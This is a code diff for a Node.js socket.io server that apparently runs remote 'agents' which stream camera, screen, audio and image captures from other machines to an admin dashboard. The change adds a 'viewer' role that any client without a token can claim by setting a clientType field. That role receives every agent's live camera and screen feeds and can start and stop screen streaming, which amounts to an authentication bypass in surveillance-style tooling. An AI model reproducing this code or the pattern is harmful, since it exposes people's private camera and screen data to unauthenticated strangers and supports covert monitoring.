@@ -15,6 +15,7 @@ const TRUST_PROXY = process.env.TRUST_PROXY || 'true';
 const VISITOR_COLLECTION = process.env.FIREBASE_VISITOR_COLLECTION || 'visitor_ips';
 const BLOCKED_IP_CACHE_TTL_MS = Math.max(Number(process.env.BLOCKED_IP_CACHE_TTL_MS) || 30000, 5000);
 const ADMIN_ROOM = 'admins';
+const VIEWER_ROOM = 'viewers';
 const AGENT_ROOM = 'agents';
 const AGENT_STATIC_ROUTE = '/agent';
 const STREAM_VIEWER_ROUTE = '/live-stream';
@@ -448,11 +449,27 @@ io.use(async (socket, next) => {
         }
     }
 
+    const clientTypeRaw = socket.handshake.auth?.clientType || socket.handshake.query?.clientType;
+    const clientType = String(clientTypeRaw || '').trim().toLowerCase();
     const tokenFromAuth = socket.handshake.auth?.token;
     const tokenFromHeader = parseBearerToken(socket.handshake.headers?.authorization);
     const idToken = tokenFromAuth || tokenFromHeader;
 
     if (!idToken) {
+        if (clientType === 'viewer') {
+            socket.data.role = 'viewer';
+            recordVisitorVisit({
+                ip: clientIp,
+                pathName: '/socket.io',
+                method: 'WS',
+                userAgent: socket.handshake.headers?.['user-agent'] || '',
+                source: 'socket-viewer'
+            }).catch((error) => {
+                console.error(`[ip-security] Failed to store socket viewer: ${error.message}`);
+            });
+            return next();
+        }
+
         socket.data.role = 'agent';
         recordVisitorVisit({
             ip: clientIp,
@@ -778,10 +795,15 @@ app.post('/admin/blocked-ips/unblock', requireAdmin, async (req, res) => {
 
 io.on('connection', (socket) => {
     const isAdmin = socket.data.role === 'admin';
+    const isViewer = socket.data.role === 'viewer';
 
     if (isAdmin) {
         socket.join(ADMIN_ROOM);
         console.log(`[admin] connected: ${socket.id} (${socket.data.user?.email || 'unknown'})`);
+        socket.emit('update_agent_list', Object.values(agents));
+    } else if (isViewer) {
+        socket.join(VIEWER_ROOM);
+        console.log(`[viewer] connected: ${socket.id}`);
         socket.emit('update_agent_list', Object.values(agents));
     } else {
         socket.join(AGENT_ROOM);
@@ -789,7 +811,9 @@ io.on('connection', (socket) => {
     }
 
     const emitAgentList = () => {
-        io.to(ADMIN_ROOM).emit('update_agent_list', Object.values(agents));
+        const agentList = Object.values(agents);
+        io.to(ADMIN_ROOM).emit('update_agent_list', agentList);
+        io.to(VIEWER_ROOM).emit('update_agent_list', agentList);
     };
 
     const emitControl = (eventName, payload = {}) => {
@@ -845,7 +869,7 @@ io.on('connection', (socket) => {
     };
 
     socket.on('register_node', (data = {}) => {
-        if (isAdmin) {
+        if (isAdmin || isViewer) {
             return;
         }
 
@@ -867,7 +891,7 @@ io.on('connection', (socket) => {
     });
 
     socket.on('agent_state_update', (data = {}) => {
-        if (isAdmin) {
+        if (isAdmin || isViewer) {
             return;
         }
 
@@ -888,7 +912,7 @@ io.on('connection', (socket) => {
         };
 
         emitAgentList();
-        io.to(ADMIN_ROOM).emit('ui_agent_state', {
+        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_agent_state', {
             agentId: socket.id,
             machine: agents[socket.id].machine,
             recording: agents[socket.id].recording,
@@ -963,7 +987,7 @@ io.on('connection', (socket) => {
     });
 
     socket.on('admin_start_screen_stream', (payload) => {
-        if (!isAdmin) {
+        if (!isAdmin && !isViewer) {
             return;
         }
         const result = emitControl('start_screen_stream', payload);
@@ -971,7 +995,7 @@ io.on('connection', (socket) => {
     });
 
     socket.on('admin_stop_screen_stream', (payload) => {
-        if (!isAdmin) {
+        if (!isAdmin && !isViewer) {
             return;
         }
         const result = emitControl('stop_screen_stream', payload);
@@ -1012,12 +1036,12 @@ io.on('connection', (socket) => {
 
     // Relay Camera Frames from Agent to Dashboard
     socket.on('camera_frame', (data) => {
-        if (isAdmin) {
+        if (isAdmin || isViewer) {
             return;
         }
 
         const agent = agents[socket.id] || { machine: 'Unknown-PC' };
-        io.to(ADMIN_ROOM).emit('ui_camera_display', {
+        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_camera_display', {
             ...data,
             agentId: socket.id,
             machine: agent.machine
@@ -1025,12 +1049,12 @@ io.on('connection', (socket) => {
     });
 
     socket.on('screen_stream_frame', (data = {}) => {
-        if (isAdmin) {
+        if (isAdmin || isViewer) {
             return;
         }
 
         const agent = agents[socket.id] || { machine: 'Unknown-PC' };
-        io.to(ADMIN_ROOM).emit('ui_screen_stream_frame', {
+        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_screen_stream_frame', {
             ...data,
             agentId: socket.id,
             machine: agent.machine,
@@ -1039,12 +1063,12 @@ io.on('connection', (socket) => {
     });
 
     socket.on('video_upload_complete', (data) => {
-        if (isAdmin) {
+        if (isAdmin || isViewer) {
             return;
         }
 
         const agent = agents[socket.id] || { machine: 'Unknown-PC' };
-        io.to(ADMIN_ROOM).emit('new_video_link', {
+        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('new_video_link', {
             ...data,
             mediaType: data?.mediaType || 'video',
             agentId: socket.id,
@@ -1053,12 +1077,12 @@ io.on('connection', (socket) => {
     });
 
     socket.on('audio_upload_complete', (data) => {
-        if (isAdmin) {
+        if (isAdmin || isViewer) {
             return;
         }
 
         const agent = agents[socket.id] || { machine: 'Unknown-PC' };
-        io.to(ADMIN_ROOM).emit('new_video_link', {
+        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('new_video_link', {
             ...data,
             mediaType: 'audio',
             agentId: socket.id,
@@ -1067,12 +1091,12 @@ io.on('connection', (socket) => {
     });
 
     socket.on('image_upload_complete', (data = {}) => {
-        if (isAdmin) {
+        if (isAdmin || isViewer) {
             return;
         }
 
         const agent = agents[socket.id] || { machine: 'Unknown-PC' };
-        io.to(ADMIN_ROOM).emit('new_video_link', {
+        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('new_video_link', {
             ...data,
             mediaType: 'image',
             agentId: socket.id,
@@ -1098,7 +1122,7 @@ io.on('connection', (socket) => {
         };
 
         emitAgentList();
-        io.to(ADMIN_ROOM).emit('ui_image_sync_status', {
+        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_image_sync_status', {
             ...data,
             agentId: socket.id,
             machine: data?.machine || agent.machine
@@ -1158,11 +1182,15 @@ io.on('connection', (socket) => {
             console.log(`[admin] disconnected: ${socket.id}`);
             return;
         }
+        if (isViewer) {
+            console.log(`[viewer] disconnected: ${socket.id}`);
+            return;
+        }
 
         console.log(`[agent-socket] disconnected: ${socket.id}`);
         delete agents[socket.id];
         emitAgentList();
-        io.to(ADMIN_ROOM).emit('ui_agent_state', {
+        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_agent_state', {
             agentId: socket.id,
             online: false,
             recording: false,
